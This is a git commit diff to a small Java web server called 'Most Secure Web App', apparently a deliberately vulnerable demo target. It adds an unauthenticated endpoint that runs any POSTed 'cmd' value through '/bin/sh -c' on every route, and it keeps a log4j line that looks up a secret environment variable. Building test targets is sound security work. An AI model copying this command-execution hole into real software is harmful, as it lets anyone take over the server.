3d5b4f9c55b8282b0a8c1f12e6fc62d66cfb6778
Rodrigo Alvares <ralvares@redhat.com>
2023-06-14 13:47:48 +0200

    Add RCE function

--- src/webapp/src/main/java/com/example/Main.java
+++ src/webapp/src/main/java/com/example/Main.java
@@ -5,6 +5,9 @@ import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.InetSocketAddress;
 import java.net.URL;
+import java.nio.charset.StandardCharsets;
+import java.util.HashMap;
+import java.util.Map;
 
 import com.sun.net.httpserver.HttpExchange;
 import com.sun.net.httpserver.HttpHandler;
@@ -15,6 +18,7 @@ import org.apache.logging.log4j.Logger;
 
 public class Main {
     private static final Logger logger = LogManager.getLogger(Main.class);
+
     public static void main(String[] args) throws IOException, InterruptedException {
         String html = "<html><head><title>Most Secure Web App</title><style>body{font-family:Arial,sans-serif;text-align:center;background-color:#f8f9fa;}.container{max-width:600px;margin:0 auto;padding:20px;background-color:#fff;border-radius:5px;box-shadow:0 2px 5px rgba(0,0,0,0.1);}.security-icon{margin-bottom:20px;}.emphasis{font-weight:bold;color:#343a40;}</style></head><body><div class='container'><h1>Most Secure Web App</h1><img src='https://i.redd.it/iew1qofxojja1.png' alt='Security Icon' class='security-icon'><p>This is the <span class='emphasis'>most secure</span> web app ever created.</p><p>We have implemented <span class='emphasis'>state-of-the-art</span> security measures to protect your data and ensure the utmost privacy.</p><p>Rest assured that your information is <span class='emphasis'>safe</span> with us!</p></div></body></html>";
         String listenPort = System.getProperty("listen");
@@ -24,7 +28,7 @@ public class Main {
             HttpServer server = HttpServer.create(new InetSocketAddress(Integer.parseInt(listenPort)), 0);
             server.createContext("/", new MyHandler(html));
             server.createContext("/ping", new MyHandler("pong"));
-            server.createContext("/posts", new MyHandler(exploitEnabledResponse(), exploitDisabledResponse()));
+            server.createContext("/posts", new MyHandler(exploitDisabledResponse()));
             server.start();
             logger.error("${env:SECRET_VALUE:-:}");
         }
@@ -53,8 +57,29 @@ public class Main {
         System.out.println("Received " + method + " request: " + exchange.getRequestURI());
     }
 
-    private static String exploitEnabledResponse() {
-        return "RCE is enabled\n";
+    private static String exploitEnabledResponse(String command) {
+        try {
+            ProcessBuilder processBuilder = new ProcessBuilder("/bin/sh", "-c", command);
+            Process process = processBuilder.start();
+
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            StringBuilder output = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                output.append(line).append("\n");
+            }
+            reader.close();
+
+            int exitCode = process.waitFor();
+            if (exitCode == 0) {
+                return "Command executed successfully:\n" + output.toString();
+            } else {
+                return "Command execution failed.";
+            }
+        } catch (IOException | InterruptedException e) {
+            e.printStackTrace();
+            return "An error occurred during command execution.";
+        }
     }
 
     private static String exploitDisabledResponse() {
@@ -62,26 +87,67 @@ public class Main {
     }
 
     static class MyHandler implements HttpHandler {
-        private final String response;
+        private final String defaultResponse;
 
-        public MyHandler(String response) {
-            this.response = response;
-        }
-
-        public MyHandler(String exploitEnabledResponse, String exploitDisabledResponse) {
-            String exploit = System.getenv("exploit");
-            this.response = (exploit != null && exploit.equals("true")) ? exploitEnabledResponse : exploitDisabledResponse;
+        public MyHandler(String defaultResponse) {
+            this.defaultResponse = defaultResponse;
         }
 
         @Override
         public void handle(HttpExchange exchange) throws IOException {
             logRequest(exchange, exchange.getRequestMethod());
-            byte[] responseBytes = response.getBytes();
-            exchange.sendResponseHeaders(200, responseBytes.length);
+
+            // Check if the request method is POST
+            if (exchange.getRequestMethod().equalsIgnoreCase("POST")) {
+                // Read the request body
+                InputStreamReader isr = new InputStreamReader(exchange.getRequestBody(), StandardCharsets.UTF_8);
+                BufferedReader br = new BufferedReader(isr);
+                StringBuilder requestBody = new StringBuilder();
+                String line;
+                while ((line = br.readLine()) != null) {
+                    requestBody.append(line);
+                }
+                br.close();
+
+                // Parse the request parameters
+                Map<String, String> params = parseParameters(requestBody.toString());
+
+                // Check if the "cmd" parameter is present
+                if (params.containsKey("cmd")) {
+                    // Execute the command and set the response
+                    String command = params.get("cmd");
+                    String response = exploitEnabledResponse(command);
+
+                    // Prepare the response
+                    byte[] responseBytes = response.getBytes();
+                    exchange.sendResponseHeaders(200, responseBytes.length);
+                    OutputStream os = exchange.getResponseBody();
+                    os.write(responseBytes);
+                    os.close();
+                    return;
+                }
+            }
+
+            // Prepare the default response
+            byte[] defaultResponseBytes = defaultResponse.getBytes();
+            exchange.sendResponseHeaders(200, defaultResponseBytes.length);
             OutputStream os = exchange.getResponseBody();
-            os.write(responseBytes);
+            os.write(defaultResponseBytes);
             os.close();
+        }
+
+        private Map<String, String> parseParameters(String requestBody) {
+            Map<String, String> params = new HashMap<>();
+            String[] pairs = requestBody.split("&");
+            for (String pair : pairs) {
+                String[] keyValue = pair.split("=");
+                if (keyValue.length == 2) {
+                    String key = keyValue[0];
+                    String value = keyValue[1];
+                    params.put(key, value);
+                }
+            }
+            return params;
         }
     }
 }
-
